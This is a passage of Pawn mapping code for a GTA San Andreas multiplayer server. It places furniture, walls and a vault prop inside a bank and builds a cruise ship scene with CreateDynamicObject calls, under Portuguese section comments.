	CreateDynamicObject(8659, 1811.71301, -1696.95837, 13.45430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(8659, 1811.71509, -1707.46570, 13.43430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(8659, 1754.82129, -1697.29626, 13.45430,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(8659, 1754.85950, -1707.17102, 13.43430,   0.00000, 0.00000, 90.00000);

	// OBJETOS DENTRO DO BANCO //

	CreateDynamicObject(19452, 1784.98254, -1704.60828, 16.06000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19452, 1791.20959, -1706.29773, 16.06000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19452, 1786.38647, -1700.99890, 16.08000,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 1785.32239, -1704.44482, 16.08000,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19452, 1786.22070, -1704.53455, 16.06000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19376, 1779.10181, -1712.36304, 16.02000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(2942, 1764.39990, -1704.64392, 13.13030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2942, 1764.39941, -1706.46680, 13.13030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2942, 1764.39978, -1708.14832, 13.13030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2942, 1764.39954, -1709.82361, 13.13030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2942, 1764.39990, -1711.66882, 13.13030,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2942, 1764.38318, -1713.48779, 13.13030,   0.00000, 0.00000, 90.00000);
	Vault = CreateObject(2634, 1770.55737, -1694.13037, 13.94880,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2886, 1770.80310, -1695.43396, 13.79080,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3280, 1788.68311, -1706.98242, 16.08770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(3280, 1791.99072, -1700.69250, 16.08770,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 1783.39758, -1694.20630, 12.51060,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1502, 1783.35669, -1706.98669, 12.51060,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2008, 1776.66333, -1700.96094, 12.51140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2008, 1778.65771, -1700.97412, 12.51140,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2009, 1780.64124, -1699.91785, 12.51220,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2186, 1778.84143, -1692.24170, 12.50968,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 1775.74902, -1699.72620, 12.51060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 1777.75757, -1699.72620, 12.51060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1714, 1779.66003, -1699.72620, 12.51060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2007, 1777.42725, -1692.30872, 12.50960,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1784.16943, -1704.52002, 12.51090,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1892, 1783.72070, -1706.75562, 12.50920,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1714, 1791.24072, -1705.42383, 12.51160,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2008, 1790.10767, -1706.34790, 12.51150,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1788.30884, -1705.16016, 12.51100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1715, 1788.43164, -1706.38208, 12.51100,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2921, 1783.78931, -1710.83569, 15.25250,   0.00000, 0.00000, -105.78000);
	CreateDynamicObject(1827, 1786.44409, -1703.69702, 12.50949,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2186, 1790.64026, -1702.06702, 12.51183,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2007, 1792.33801, -1709.00159, 12.51110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(2007, 1792.35632, -1708.01831, 12.51110,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(1808, 1786.49524, -1710.59912, 12.51090,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2826, 1786.33325, -1703.74219, 12.93616,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14455, 1792.55750, -1706.79382, 14.19170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(3858, 1774.46118, -1701.51733, 16.90160,   0.02000, 0.00000, 45.36000);
	CreateDynamicObject(3858, 1788.57288, -1717.12891, 12.40887,   0.00000, 0.00000, 44.76000);
	CreateDynamicObject(1502, 1781.72937, -1701.47327, 12.51060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(14455, 1775.99622, -1691.96814, 14.19170,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(14455, 1792.61255, -1697.27832, 14.19170,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1723, 1784.00732, -1709.88757, 12.51090,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1723, 1783.91858, -1711.78833, 12.51090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1789.57373, -1711.84924, 12.51090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1723, 1769.60974, -1702.13611, 12.51090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(16378, 1790.38940, -1699.65894, 13.26880,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2332, 1783.99646, -1701.00891, 12.90990,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1784.82190, -1700.97949, 12.90990,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1723, 1784.06531, -1697.72754, 12.51090,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1723, 1785.80530, -1692.48169, 12.51090,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19174, 1787.25256, -1701.61462, 14.54680,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19172, 1789.30444, -1710.81628, 14.66670,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(3858, 1768.65784, -1717.12354, 12.40887,   0.00000, 0.00000, 44.76000);
	CreateDynamicObject(19174, 1792.70081, -1714.13892, 14.59660,   0.00000, 0.00000, -90.00000);
	CreateDynamicObject(19173, 1787.83765, -1711.07910, 14.39714,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1808, 1786.70337, -1716.79065, 12.51090,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1502, 1776.86853, -1717.08911, 12.51060,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1502, 1779.90479, -1717.05017, 12.51060,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2412, 1780.24146, -1716.32031, 12.51070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2412, 1777.20325, -1716.32031, 12.51070,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2003, 1770.06592, -1701.09558, 12.89180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1769.21899, -1700.68774, 12.89180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1768.37598, -1701.04163, 12.89180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1550, 1770.17517, -1699.16748, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1550, 1770.31628, -1698.69421, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1550, 1770.29810, -1697.99341, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1829, 1767.53845, -1700.67346, 12.89180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1766.70691, -1700.68323, 12.89180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1770.07800, -1701.08459, 13.79180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2332, 1769.23718, -1701.08130, 13.79180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1768.37854, -1700.69653, 13.79180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(2003, 1767.55273, -1701.12073, 13.79180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1766.70691, -1700.68323, 13.79180,   0.00000, 0.00000, 180.00000);
	CreateDynamicObject(1829, 1764.81787, -1699.16467, 12.89180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1550, 1769.61926, -1698.61145, 12.89180,   0.00000, 90.00000, 180.00000);
	CreateDynamicObject(1550, 1769.95911, -1698.35583, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2332, 1764.49158, -1698.35193, 12.89180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2003, 1764.39502, -1697.53345, 12.89180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1829, 1764.82446, -1696.68359, 12.89180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1829, 1764.81885, -1695.83948, 12.89180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1829, 1764.81787, -1699.16467, 13.79180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2332, 1764.49158, -1698.35193, 13.79180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2332, 1764.48010, -1697.54175, 13.79180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(2003, 1764.33496, -1696.70667, 13.79180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1829, 1764.81885, -1695.83948, 13.79180,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(1550, 1765.77393, -1701.24365, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1550, 1765.20190, -1701.20874, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1550, 1764.65515, -1701.15942, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(1550, 1765.57434, -1700.58289, 12.89180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2921, 1773.14807, -1701.48279, 15.19250,   0.00000, 0.00000, -37.37999);
	CreateDynamicObject(2921, 1773.23328, -1701.52063, 15.19250,   0.00000, 0.00000, 74.06064);
	CreateDynamicObject(2921, 1783.36987, -1702.89551, 15.19250,   0.00000, 0.00000, 49.00000);
	CreateDynamicObject(2773, 1776.82080, -1702.59290, 12.99040,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 1778.83826, -1702.60291, 12.99040,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 1781.10132, -1702.59338, 12.99040,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(2773, 1774.79211, -1702.60254, 12.99040,   0.00000, 0.00000, 0.00000);

	// TETO BANCO //

	CreateDynamicObject(19377, 1766.61926, -1712.33557, 21.92000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19362, 1760.98389, -1716.50952, 21.98000,   0.00000, 90.00000, -58.26000);
	CreateDynamicObject(19362, 1795.43884, -1691.06470, 21.90000,   0.00000, 90.00000, -58.26002);
	CreateDynamicObject(19362, 1760.97009, -1690.83911, 21.94000,   0.00000, 90.00000, 58.26000);
	CreateDynamicObject(19362, 1795.58655, -1716.44177, 21.90000,   0.00000, 90.00000, 59.94001);
	CreateDynamicObject(19362, 1781.85962, -1718.73047, 21.90000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19362, 1775.17322, -1718.74768, 21.90000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1766.62915, -1702.81921, 21.92000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1766.62915, -1695.05945, 21.91950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1777.09314, -1695.06982, 21.91950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1777.07434, -1702.89636, 21.92000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1777.08093, -1712.41748, 21.92000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19457, 1791.20300, -1697.18274, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19457, 1789.59204, -1703.09424, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19457, 1792.85254, -1696.95471, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19457, 1787.85828, -1703.02673, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1788.54492, -1701.35059, 16.14470,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1792.09045, -1695.16052, 16.14470,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19438, 1788.73730, -1707.71985, 17.82000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19438, 1791.94629, -1701.57324, 17.82000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1787.44177, -1712.31091, 21.91950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(3280, 1783.18127, -1691.22327, 22.00462,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19457, 1787.86243, -1697.13135, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19457, 1783.10840, -1692.41113, 17.82000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19457, 1783.04260, -1692.38232, 20.20000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19454, 1782.53662, -1692.05493, 16.14470,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19457, 1782.85986, -1690.63245, 20.20000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19438, 1780.10840, -1691.53052, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19457, 1788.29480, -1690.62610, 17.82000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19438, 1780.08850, -1691.52869, 20.20000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1786.03564, -1692.01904, 16.14470,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19454, 1785.71313, -1694.90137, 16.14470,   0.00000, 90.00000, 90.00000);
	CreateDynamicObject(19457, 1789.60168, -1697.23376, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19438, 1790.32654, -1692.45483, 17.82000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19457, 1792.92908, -1695.34131, 17.82000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19438, 1787.77637, -1691.51013, 20.20000,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19454, 1788.89160, -1703.05823, 19.54000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1789.53809, -1695.59241, 19.54000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1791.59546, -1697.24353, 19.54000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1791.70105, -1695.65735, 19.54000,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19457, 1783.71033, -1690.62195, 17.82000,   0.00000, 0.00000, 90.00000);
	CreateDynamicObject(19377, 1787.44873, -1702.90039, 21.89950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19377, 1787.48889, -1696.88550, 21.91950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1793.16479, -1712.31067, 21.89950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1793.16479, -1702.66492, 21.89950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1793.16479, -1695.00342, 21.85950,   0.00000, 90.00000, 0.00000);
	CreateDynamicObject(19454, 1788.74951, -1691.94104, 21.87950,   0.00000, 90.00000, 90.00000);

    // CRUZEIRO
	CreateDynamicObject(5167, 716.409851, -2244.536621, 8.249287, 0.0000, 0.0000, 180.0001);
	CreateDynamicObject(5160, 608.809814, -2236.467041, 6.213254, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(5166, 609.001770, -2236.530273, 6.230834, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(5157, 555.801270, -2244.636230, 17.982382, 0.0000, 0.0000, 180.0006);
	CreateDynamicObject(5156, 664.507935, -2244.539063, 11.992601, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(5155, 643.270020, -2244.763184, 22.119402, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(5158, 667.242676, -2244.405029, 12.769373, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(3934, 749.399536, -2244.288330, 12.105138, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2773, 705.043579, -2228.289795, 12.612470, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(2773, 693.798950, -2228.288818, 12.588098, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(2773, 702.368164, -2228.281006, 12.613513, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(2773, 696.668457, -2228.281006, 12.588513, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(2773, 699.592651, -2228.231201, 12.588513, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(4206, 701.106018, -2247.432617, 12.118996, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2774, 736.050415, -2247.917725, 12.373640, 269.7591, 359.1406, 359.1406);
	CreateDynamicObject(2774, 736.065979, -2241.255127, 12.356094, 269.7591, 0.0000, 180.0000);
	CreateDynamicObject(3666, 755.133850, -2252.151367, 12.627266, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3666, 741.440735, -2253.952881, 12.640640, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3666, 740.622986, -2235.199707, 12.591440, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(3666, 755.810730, -2236.245850, 12.626778, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(11544, 732.526550, -2244.212646, 12.542543, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(11544, 738.829346, -2244.256104, 12.550952, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1341, 713.376038, -2229.400879, 13.143497, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1340, 618.824585, -2254.898193, 13.067955, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(1255, 721.994324, -2252.467773, 12.590038, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.963928, -2254.338623, 12.588756, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.976563, -2249.131836, 12.564487, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.976807, -2247.408691, 12.539487, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.251343, -2247.279297, 12.439488, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.226563, -2249.177734, 12.389489, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.152466, -2252.453613, 12.589486, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.102661, -2254.429688, 12.589486, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 730.126953, -2252.380859, 12.439488, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 730.077393, -2254.330078, 12.489488, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.970642, -2257.126709, 12.439417, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.970154, -2258.752197, 12.439417, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.170593, -2257.304932, 12.589415, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.145081, -2258.907471, 12.589415, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 729.845520, -2257.257080, 12.564415, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 729.820740, -2258.851807, 12.589415, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(626, 717.587219, -2259.697754, 14.198588, 0.0000, 0.0000, 78.7500);
	CreateDynamicObject(626, 734.175903, -2259.357666, 14.183504, 0.0000, 0.0000, 78.7500);
	CreateDynamicObject(626, 733.978577, -2246.879150, 14.183331, 0.0000, 0.0000, 236.2500);
	CreateDynamicObject(626, 734.093567, -2241.002441, 14.183927, 0.0000, 0.0000, 135.0000);
	CreateDynamicObject(626, 734.030579, -2228.943115, 14.184305, 0.0000, 0.0000, 11.2500);
	CreateDynamicObject(626, 717.396851, -2229.072021, 14.190570, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1255, 726.349609, -2241.363525, 12.539498, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.351807, -2239.369385, 12.589498, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 722.000854, -2241.222900, 12.589517, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.925049, -2239.346436, 12.564517, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.381592, -2235.925781, 12.564651, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.990967, -2235.906494, 12.564721, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.367126, -2233.929199, 12.614066, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 722.017456, -2233.805664, 12.564067, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.451538, -2231.185303, 12.463634, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 726.441528, -2229.452637, 12.538610, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 721.987183, -2231.148193, 12.614672, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 722.107178, -2229.299561, 12.589686, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 729.838196, -2233.916016, 12.612139, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 729.884888, -2231.309082, 12.588022, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 729.984619, -2229.511475, 12.538023, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1255, 729.821594, -2236.134521, 12.612547, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(18368, 727.222839, -2239.594971, 6.023196, 0.0000, 0.0000, 78.7500);
	CreateDynamicObject(16151, 711.249207, -2228.782471, 12.385480, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(16501, 711.027710, -2227.699219, 13.098989, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(1281, 715.965271, -2241.027832, 12.942957, 0.0000, 0.0000, 292.5000);
	CreateDynamicObject(1281, 715.005249, -2235.387451, 12.933676, 0.0000, 0.0000, 213.7500);
	CreateDynamicObject(1281, 716.915283, -2249.379883, 12.942725, 0.0000, 0.0000, 258.7500);
	CreateDynamicObject(3496, 681.010620, -2261.021973, 12.032242, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(16501, 681.075989, -2261.348877, 13.975574, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(1280, 676.320984, -2255.372559, 12.486426, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1280, 676.356140, -2250.438232, 12.536417, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2774, 674.874451, -2249.018799, 12.375004, 269.7591, 0.0000, 0.0000);
	CreateDynamicObject(1461, 719.486389, -2260.910889, 12.750745, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1461, 719.832153, -2227.982910, 12.792845, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1598, 704.262573, -2252.610352, 12.450645, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(7921, 690.468384, -2242.162598, 11.746148, 0.0000, 0.0000, 157.5000);
	CreateDynamicObject(7921, 691.976746, -2239.499756, 11.720405, 0.0000, 0.0000, 141.0161);
	CreateDynamicObject(7921, 694.134888, -2237.720459, 11.720127, 0.0000, 0.0000, 121.9538);
	CreateDynamicObject(7921, 696.852173, -2236.424072, 11.719787, 0.0000, 0.0000, 107.1887);
	CreateDynamicObject(7921, 699.609009, -2235.729492, 11.718742, 0.0000, 0.0000, 101.9548);
	CreateDynamicObject(7921, 702.313477, -2235.669922, 11.718105, 0.0000, 0.0000, 80.3142);
	CreateDynamicObject(7921, 705.251831, -2236.369629, 11.717570, 0.0000, 0.0000, 70.0010);
	CreateDynamicObject(7921, 707.798218, -2237.803955, 11.741302, 0.0000, 0.0000, 50.9388);
	CreateDynamicObject(7921, 710.117920, -2239.928223, 11.716668, 0.0000, 0.0000, 44.0633);
	CreateDynamicObject(7921, 711.893005, -2242.341797, 11.716473, 0.0000, 0.0000, 27.5020);
	CreateDynamicObject(7921, 712.786987, -2245.039063, 11.690986, 0.0000, 0.0000, 9.2992);
	CreateDynamicObject(7921, 712.912781, -2247.947510, 11.715702, 0.0000, 0.0000, 356.3303);
	CreateDynamicObject(7921, 712.326477, -2250.946045, 11.641456, 0.0000, 0.0000, 343.3614);
	CreateDynamicObject(7921, 711.163269, -2253.789307, 11.616771, 0.0000, 0.0000, 332.1887);
	CreateDynamicObject(7921, 709.328430, -2255.991211, 11.574773, 0.0000, 0.0000, 308.8293);
	CreateDynamicObject(7921, 706.749695, -2257.676758, 11.600371, 0.0000, 0.0000, 297.6567);
	CreateDynamicObject(7921, 703.938293, -2258.742676, 11.625733, 0.0000, 0.0000, 283.7510);
	CreateDynamicObject(7921, 689.568115, -2245.105957, 11.746428, 0.0000, 0.0000, 168.7500);
	CreateDynamicObject(7921, 689.296509, -2248.144531, 11.721182, 0.0000, 0.0000, 180.7822);
	CreateDynamicObject(7921, 689.674438, -2251.046875, 11.703750, 0.0000, 0.0000, 194.5333);
	CreateDynamicObject(7921, 690.837769, -2253.717285, 11.703344, 0.0000, 0.0000, 211.7993);
	CreateDynamicObject(7921, 692.780090, -2255.898682, 11.702913, 0.0000, 0.0000, 231.7211);
	CreateDynamicObject(7921, 695.347168, -2257.707764, 11.652456, 0.0000, 358.2811, 238.5965);
	CreateDynamicObject(7921, 698.043213, -2258.836182, 11.627044, 0.0000, 358.2811, 255.7851);
	CreateDynamicObject(7921, 700.970398, -2259.163818, 11.576378, 0.0000, 358.2811, 271.2548);
	CreateDynamicObject(1598, 701.875000, -2240.886963, 12.451643, 0.0000, 0.0000, 78.7500);
	CreateDynamicObject(4206, 701.056824, -2247.292480, 12.343914, 0.0000, 0.0000, 311.4849);
	CreateDynamicObject(4206, 701.091248, -2247.399658, 12.719277, 0.0000, 0.0000, 281.2500);
	CreateDynamicObject(3038, 710.927429, -2227.864746, 15.117075, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1775, 675.577087, -2236.157959, 13.123116, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(1776, 674.309509, -2236.286865, 13.177341, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2773, 654.872314, -2236.722168, 19.504971, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(13646, 701.430115, -2247.292236, 12.693253, 0.0000, 0.0000, 292.5000);
	CreateDynamicObject(2714, 709.101318, -2228.349121, 14.178942, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1280, 686.037964, -2250.524658, 12.550123, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1280, 686.096252, -2255.572998, 12.549809, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(2773, 675.088623, -2229.020508, 12.610269, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(2773, 675.065491, -2231.639404, 12.610958, 0.0000, 0.0000, 180.0000);
	CreateDynamicObject(984, 650.554565, -2227.521240, 12.670623, 0.0000, 0.0000, 90.0000);
	CreateDynamicObject(3461, 701.432007, -2247.302979, 12.827651, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1281, 686.282837, -2240.131836, 12.915691, 0.0000, 0.0000, 236.2500);
	CreateDynamicObject(1281, 691.122620, -2234.677246, 12.939507, 0.0000, 0.0000, 225.0000);
	CreateDynamicObject(1281, 686.467163, -2231.050293, 12.891418, 0.0000, 0.0000, 157.5000);
	CreateDynamicObject(1281, 682.541626, -2235.926270, 12.916603, 0.0000, 0.0000, 112.4999);
	CreateDynamicObject(16000, 586.747070, -2234.217529, 12.122444, 90.2409, 0.1038, 0.0000);
	CreateDynamicObject(16000, 586.839661, -2255.447021, 12.128808, 90.2409, 0.1038, 180.0000);
	CreateDynamicObject(14399, 571.641968, -2244.382080, 11.732560, 0.0000, 0.0000, 270.0000);
	CreateDynamicObject(1215, 597.273438, -2234.312744, 12.686914, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1215, 576.275269, -2234.433350, 12.685240, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1215, 576.369324, -2255.325928, 12.619247, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(1215, 597.285095, -2255.253906, 12.691511, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(18102, 587.778809, -2247.046143, 17.357412, 0.0000, 0.0000, 359.1406);
	CreateDynamicObject(18102, 587.720459, -2245.839600, 18.376148, 307.5744, 0.0000, 359.1406);
	CreateDynamicObject(18102, 587.801758, -2242.795166, 18.031965, 335.0764, 359.1406, 179.1406);
	CreateDynamicObject(640, 603.275146, -2249.831299, 12.715396, 0.0000, 0.0000, 0.0000);
	CreateDynamicObject(640, 603.241272, -2254.957520, 12.677360, 0.0000, 355.7028, 0.0000);
	CreateDynamicObject(640, 603.240417, -2240.367920, 12.664941, 0.0000, 355.7028, 0.0000);
